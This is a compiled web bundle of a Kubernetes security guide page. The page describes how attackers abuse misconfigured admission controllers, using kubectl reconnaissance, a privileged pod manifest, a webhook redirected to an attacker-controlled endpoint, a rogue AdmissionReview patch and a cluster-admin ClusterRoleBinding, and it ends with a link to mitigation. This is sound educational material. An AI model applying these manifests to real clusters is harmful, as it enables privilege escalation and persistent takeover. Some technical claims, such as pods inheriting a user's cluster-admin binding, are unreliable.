"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[5223],{8323:(e,i,s)=>{s.r(i),s.d(i,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>t,metadata:()=>n,toc:()=>d});const n=JSON.parse('{"id":"attack_vectors/misconfigured_admission_controllers","title":"Misconfigured Admission Controllers","description":"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies.","source":"@site/docs/attack_vectors/misconfigured_admission_controllers.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/misconfigured_admission_controllers","permalink":"/k8s_security/docs/attack_vectors/misconfigured_admission_controllers","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack_vectors/misconfigured_admission_controllers.md","tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":8,"frontMatter":{"sidebar_position":8,"title":"Misconfigured Admission Controllers","description":"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."},"sidebar":"default","previous":{"title":"Insecure RBAC Permissions","permalink":"/k8s_security/docs/attack_vectors/insecure_rbac_permissions"},"next":{"title":"Container Escape","permalink":"/k8s_security/docs/attack_vectors/privileged_container_escape"}}');var r=s(4848),o=s(8453);const t={sidebar_position:8,title:"Misconfigured Admission Controllers",description:"How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."},a="Misconfigured Admission Controllers",c={},d=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Identify Disabled or Weak Admission Controllers",id:"1-identify-disabled-or-weak-admission-controllers",level:3},{value:"2. Deploy Privileged Pods",id:"2-deploy-privileged-pods",level:3},{value:"3. Discover and Inspect Webhooks",id:"3-discover-and-inspect-webhooks",level:3},{value:"4. Hijack Webhook Behavior",id:"4-hijack-webhook-behavior",level:3},{value:"5. Maintain Persistence via ClusterRoleBinding",id:"5-maintain-persistence-via-clusterrolebinding",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function l(e){const i={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(i.header,{children:(0,r.jsx)(i.h1,{id:"misconfigured-admission-controllers",children:"Misconfigured Admission Controllers"})}),"\n",(0,r.jsxs)(i.p,{children:["Kubernetes ",(0,r.jsx)(i.strong,{children:"admission controllers"})," intercept and validate requests before they reach the API server. When improperly configured\u2014such as being disabled, weakly enforced, or exposing insecure webhooks\u2014they become a key target for attackers seeking to ",(0,r.jsx)(i.strong,{children:"bypass security controls, escalate privileges, or persist within the cluster"}),"."]}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,r.jsx)(i.h3,{id:"1-identify-disabled-or-weak-admission-controllers",children:"1. Identify Disabled or Weak Admission Controllers"}),"\n",(0,r.jsx)(i.p,{children:"The attacker identifies which admission controllers are missing or misconfigured."}),"\n",(0,r.jsx)(i.pre,{children:(0,r.jsx)(i.code,{className:"language-bash",children:"kubectl api-versions | grep admission\nps aux | grep kube-apiserver\n"})}),"\n",(0,r.jsxs)(i.p,{children:["If ",(0,r.jsx)(i.strong,{children:"PodSecurity"}),", ",(0,r.jsx)(i.strong,{children:"ValidatingAdmissionWebhook"}),", or ",(0,r.jsx)(i.strong,{children:"MutatingAdmissionWebhook"})," are missing, or misconfigured, the attacker proceeds."]}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h3,{id:"2-deploy-privileged-pods",children:"2. Deploy Privileged Pods"}),"\n",(0,r.jsx)(i.p,{children:"Without proper admission policies, an attacker can launch pods that break security boundaries."}),"\n",(0,r.jsx)(i.pre,{children:(0,r.jsx)(i.code,{className:"language-yaml",children:"apiVersion: v1\nkind: Pod\nmetadata:\n  name: attacker-pod\nspec:\n  containers:\n    - name: exploit-container\n      image: alpine\n      securityContext:\n        privileged: true\n"})}),"\n",(0,r.jsxs)(i.p,{children:["If ",(0,r.jsx)(i.strong,{children:"PodSecurity admission"})," is missing or misconfigured, this pod will be created without restriction."]}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h3,{id:"3-discover-and-inspect-webhooks",children:"3. Discover and Inspect Webhooks"}),"\n",(0,r.jsx)(i.p,{children:"The attacker lists and inspects webhook configurations:"}),"\n",(0,r.jsx)(i.pre,{children:(0,r.jsx)(i.code,{className:"language-bash",children:"kubectl get mutatingwebhookconfigurations\nkubectl get validatingwebhookconfigurations\nkubectl describe mutatingwebhookconfiguration <webhook-name>\n"})}),"\n",(0,r.jsxs)(i.p,{children:["If a webhook forwards to an ",(0,r.jsx)(i.strong,{children:"unauthenticated external endpoint"}),", the attacker crafts a malicious configuration."]}),"\n",(0,r.jsx)(i.pre,{children:(0,r.jsx)(i.code,{className:"language-yaml",children:'clientConfig:\n  url: "http://attacker-controlled-endpoint/webhook"\n'})}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h3,{id:"4-hijack-webhook-behavior",children:"4. Hijack Webhook Behavior"}),"\n",(0,r.jsx)(i.p,{children:"The attacker spins up a rogue webhook server that modifies pod requests before creation:"}),"\n",(0,r.jsx)(i.pre,{children:(0,r.jsx)(i.code,{className:"language-json",children:'{\n  "apiVersion": "admission.k8s.io/v1",\n  "kind": "AdmissionReview",\n  "response": {\n    "allowed": true,\n    "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvdGVtcGxhdGUvc2VjdXJpdHlDb250ZXh0IiwidmFsdWUiOnsiYnJ1bnRhaW5lc2NhcGVzIjp7ImFsbG93UHJpdmlsZWdlZEVzY2FsYXRpb24iOnRydWV9fX1d"\n  }\n}\n'})}),"\n",(0,r.jsx)(i.p,{children:"This patch adds privileged context to every created pod."}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h3,{id:"5-maintain-persistence-via-clusterrolebinding",children:"5. Maintain Persistence via ClusterRoleBinding"}),"\n",(0,r.jsx)(i.p,{children:"The attacker configures the webhook to inject RBAC permissions:"}),"\n",(0,r.jsx)(i.pre,{children:(0,r.jsx)(i.code,{className:"language-yaml",children:"apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: attacker-binding\nsubjects:\n  - kind: User\n    name: attacker\n    apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io\n"})}),"\n",(0,r.jsxs)(i.p,{children:["This ensures ",(0,r.jsx)(i.strong,{children:"new pods receive cluster-admin privileges"}),", even after the attacker is removed from the system."]}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h3,{id:"result",children:"Result"}),"\n",(0,r.jsxs)(i.p,{children:["The attacker successfully ",(0,r.jsx)(i.strong,{children:"bypasses admission controllers"}),", injects ",(0,r.jsx)(i.strong,{children:"malicious pod configurations"}),", and gains ",(0,r.jsx)(i.strong,{children:"persistent cluster access"})," through insecure webhook logic and privilege escalation."]}),"\n",(0,r.jsx)(i.hr,{}),"\n",(0,r.jsx)(i.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,r.jsxs)(i.p,{children:["\u27a1 ",(0,r.jsx)(i.a,{href:"/k8s_security/docs/best_practices/cluster_setup_and_hardening/api_server_security/misconfigured_admission_controllers_mitigation",children:"See Mitigation Guide for Misconfigured Admission Controllers"})]})]})}function h(e={}){const{wrapper:i}={...(0,o.R)(),...e.components};return i?(0,r.jsx)(i,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},8453:(e,i,s)=>{s.d(i,{R:()=>t,x:()=>a});var n=s(6540);const r={},o=n.createContext(r);function t(e){const i=n.useContext(o);return n.useMemo((function(){return"function"==typeof e?e(i):{...i,...e}}),[i,e])}function a(e){let i;return i=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),n.createElement(o.Provider,{value:i},e.children)}}}]);